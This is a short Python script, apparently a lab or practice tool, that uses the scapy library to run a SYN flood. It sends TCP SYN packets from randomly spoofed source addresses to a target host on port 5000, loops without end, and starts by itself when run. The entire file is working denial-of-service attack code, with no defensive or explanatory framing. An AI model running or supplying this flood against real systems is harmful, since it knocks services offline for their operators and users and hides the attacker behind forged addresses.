from scapy.all import *
from scapy.layers.inet import IP, TCP
import random

data = "asasfa"


def syn_flood(dst='172.16.1.101', dos=False, ipnum=5):
    if dos:
        ipnum = 1

    src_ip_list = ['173.16.1.' + str(host) for host in random.sample(range(1, 255), ipnum)]

    while True:
        src = random.sample(src_ip_list, 1)[0]
        print("Source ip address: " + src)
        packet = IP(src=src, dst=dst)/TCP(dport=5000, flags='S')/data
        send(packet)


syn_flood()